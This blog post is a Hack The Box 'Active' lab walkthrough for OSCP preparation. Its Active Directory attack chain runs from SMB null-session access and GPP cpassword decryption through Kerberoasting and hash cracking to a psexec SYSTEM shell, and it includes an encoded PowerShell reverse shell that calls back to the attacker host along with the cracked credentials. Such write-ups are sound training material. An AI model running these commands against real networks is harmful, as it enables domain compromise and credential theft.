---
layout: post
title:  HTB Active Write-up
description: Part of the OSCP+ Preparation Active Directory Series
date:   2024-11-01 01:00:00 +0300
image:  '/images/htb_active.png'
tags:   [Write-ups, HTB, OSCP+, Windows, Easy, Active-Directory, Kerberoasting]
---
# Enumeration
### Nmap
```shell
nmap -A -Pn -T4 -p- 10.129.149.20
```
```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-11-01 23:19 EDT
Nmap scan report for 10.129.149.20
Host is up (0.034s latency).
Not shown: 65512 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-02 03:20:32Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5722/tcp  open  msrpc         Microsoft Windows RPC
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49162/tcp open  msrpc         Microsoft Windows RPC
49166/tcp open  msrpc         Microsoft Windows RPC
49168/tcp open  msrpc         Microsoft Windows RPC
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=11/1%OT=53%CT=1%CU=36646%PV=Y%DS=2%DC=T%G=Y%TM=6725
OS:9ACC%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=108%TI=I%II=I%SS=S%TS=7)
OS:SEQ(SP=103%GCD=1%ISR=108%TI=I%CI=I%II=I%SS=S%TS=7)OPS(O1=M53CNW8ST11%O2=
OS:M53CNW8ST11%O3=M53CNW8NNT11%O4=M53CNW8ST11%O5=M53CNW8ST11%O6=M53CST11)WI
OS:N(W1=2000%W2=2000%W3=2000%W4=2000%W5=2000%W6=2000)ECN(R=N)ECN(R=Y%DF=Y%T
OS:=80%W=2000%O=M53CNW8NNS%CC=N%Q=)T1(R=Y%DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T
OS:2(R=N)T3(R=N)T4(R=N)T4(R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T4(R=Y%D
OS:F=Y%T=80%W=0%S=O%A=O%F=R%O=%RD=0%Q=)T5(R=N)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=O%
OS:F=AR%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T6(
OS:R=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T6(R=Y%DF=Y%T=80%W=0%S=O%A=O%F=
OS:R%O=%RD=0%Q=)T7(R=N)U1(R=N)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RI
OS:PCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-11-02T03:21:40
|_  start_date: 2024-11-02T03:08:52
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   33.99 ms 10.10.14.1
2   34.03 ms 10.129.149.20

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.65 seconds
```

Examining the Nmap results, we can identify the typical active ports of a domain controller (53, 88, 135, 139, 389, 445, 636, 3268, 3269) as well as the domain **active.htb**.

Add **active.htb** to /etc/hosts using the CLI:
```shell
echo "10.129.149.20 active.htb" | sudo tee -a /etc/hosts
```
Or with a text editor like gedit:
```shell
sudo gedit /etc/hosts
```
We can also see in our Nmap scan results that the target is running **Windows Server 2008 R2 SP1**.

### SMB Null Session access to Replication Share and finding Groups.xml
Testing SMB Null Session was successful, we can get access using:
```shell
impacket-smbclient active.htb/'':''@10.129.149.20
```
And then proceed to enumerate the available shares:
```shell
# Enter "shares" to display all the shares

# shares
ADMIN$
C$
IPC$
NETLOGON
Replication
SYSVOL
Users
```
It seems like we cannot access SYSVOL or Users but we can access the
Replication share.

Inside the Replication share we can find the file **Groups.xml**:
```shell
# The Groups.xml file is located at the following directory
cd \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups

# Use "mget" to download Groups.xml
mget Groups.xml
```

The Groups.xml file contains the cpassword for the user SVC_TGS. We can infer that this user is associated with the "Ticket Granting System" and that "SVC" stands for "Service." Therefore, this user is related to Kerberos.

_Windows previously stored Group Policy Preferences (GPP) credentials (Local Administrator credentials) in a file named Groups.xml, which was typically located in the Preferences folder within SYSVOL. This practice remained unchanged until the release of MS14-025. Our Nmap scan indicates that the target is running Windows Server 2008, which means it is potentially vulnerable._

# Foothold
### Decrypt GPP cpassword for user SVC_TGS
We can use the tool gpp-decrypt to reveal the password:
```shell
# Use gpp-decrypt to reveal the password
gpp-decrypt "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"

# Revealed password
GPPstillStandingStrong2k18
```
We can check if the credentials are valid using NetExec or other tools like CrackMapExec and Kerbrute:
```shell
nxc smb 10.129.149.20 -u SVC_TGS -p 'GPPstillStandingStrong2k18'
```
In this case, the credentials are valid.

### Kerberoasting as user SVC_TGS
Judging by the name of the SVC_TGS user, it's most likely to allow us Kerberoasting. Let's find it out:
```shell
impacket-GetUserSPNs active.htb/SVC_TGS:'GPPstillStandingStrong2k18' -dc-ip 10.129.149.20 -request
```
Eureka!

Using the command above, we indeed are able to successfully carry out our Kerberoasting attack and get the hash for the Administrator user:
```shell
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2024-11-01 23:09:48.375337             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$2f50ca798fcb10f514ade67d735db246$91dc0cfae740b51d71e3a8c3a1ae9fbee1ef440e92fe023387ef1a4c09675e5d04f9b3a7f5b65d13a06e8a7c68177204eeccf3696b5983980e2afc324bb8c801ad0ca3fe51e0d6d6e931dea0f187b519e59b264f8b53990c17a3b7944638d4be833c63ab051c13570ac969df3258bd1b00fbb9ff0041c132400a173d81e8e849c44f5e47b003e4a320e8c5d98a6496140428f9d61b398c7aaa1b77fb2d016fce903dceb53091704df81c7af453158a59ee9227d6170b3dc69cb68e6a084c2292681ec85d6c63227f4ed8e3dc0390ce027ea69ab794b1e26c082057b689f5bee8897c21c0ef6af4d813e77a376339f299258d167aed711e102cd219f692d0c9619d447486ea310a8a00ab9004a142d58545829eeb2c8b69625c33aab9caba7aee6274854cd347729bc7e65b888ec31e7cb3a9954dd8b51047c49960e2aad1cb9cf08bb6d10a9fe6483361b87b5543d83dcb91aef2eaf65e0f543ac914f60907bb290006dc2f2e55f8efc3f6538cac015d92b902cf5bc5b1737165acfb0a23cd9cdc75a653bf649b6ce5c49411482be5671f1bad2d6b95c01818da1d438ac21d00619e92d1ba7afa729d92f9e5b4dc3cb447cc44fbf5aeeeaba6a3153d615a59b0b0059803940564dddf977f8b878330237117d2ad8f082341f8b7b92d1c6bbd763c1453b4beec8aacc74aff0e8eae0e7181e10a073c5769c7f0ca42ed2dd553d4bacf074154259ba97e8905b2e445fb1b59d6f8e448a05b416b2d9323dae4685da2ac44ffd65c8e063c2b7bdae262f0d2fe03f2fea71a5f73c7ff8a532aae4c74286ee761f85a895f32a6b2c0afeac0775e0bab1f0b8d6e652245cfafa212a5fe08ea4a11fda4b52d1a3b1132eebe58d859023100d735028e0901215badeee40696ec0955a5145179ebb5389eede81ad61c10642cea53a19e95ced9676ce4f27dc46ca68ead2b9938d9cf66d7f7ee3549a3ad5de51ee9a1df8cf3a4525ba8273e309ade92d3fe44ebd050da9e493ee942e3e44311f0ad995cf99538538b71fce50cf12e6281f3002cf0f9fbdcfb7ec2769c7643311eee7bd8a5017124f6b5612fc69e5f314362dc63432d465ed288864f7835a721cc0b449ce2ac3524de8283cfefcfa1664bb3a49ddf9e39924d99f7d61ca8ae15595c17277175dd0b5ea9d236ba8cb24dfee22ebbadebead2187ad433c0c9361eb39151533298fea7afa01f58d89c5bd70feceed41107cbbd35878d83e9d185a450756be45803
```
We can crack the Administrator hash using Hascat:
```shell
# Find the -m for Kerberos TGS-REP
hashcat -h | grep -i 'kerberos'

<SNIP>
13100 | Kerberos 5, etype 23, TGS-REP                              | Network Protocol
<SNIP>

# Here we can see that the -m for Kerberos TGS-REP is 13100

# Cracking the hash
hashcat -m 13100 administrator_hash.txt /usr/share/wordlists/rockyou.txt -o cracked_administrator_hash.txt

# We managed to successfully crack the hash and get the password
cat cracked_administrator_hash.txt
<SNIP>:Ticketmaster1968

# The credentials are
Administrator:Ticketmaster1968
```

### Access using impacket-psexec
Now we can use the credentials we obtained to get access as Administrator using impacket-psexec:
```shell
# Both commands with and without domain will grant us a shell
impacket-psexec Administrator:'Ticketmaster1968'@10.129.149.20

impacket-psexec active.htb/Administrator:'Ticketmaster1968'@10.129.149.20
```
We can also try to upgrade our shell using another reverse shell on the psexec shell:
```shell
# Start nc listener
nc -lvnp 8080

# Enter reverse shell on psexec shell
powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAzACIALAA4ADAAOAAwACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==

# Getting a response on our nc listener
listening on [any] 8080 ...
connect to [10.10.14.13] from (UNKNOWN) [10.129.149.20] 49489
whoami
nt authority\system
PS C:\Windows\system32>
```
### User Flag
We can grab the user flag at:
```shell
type C:\Users\SVC_TGS\Desktop\user.txt
```

# Privilege Escalation
### Root Flag
Since we already got a shell as NT AUTHORITY\SYSTEM, we can just grab the root.txt flag with:
```shell
type C:\Users\Administrator\Desktop\root.txt
```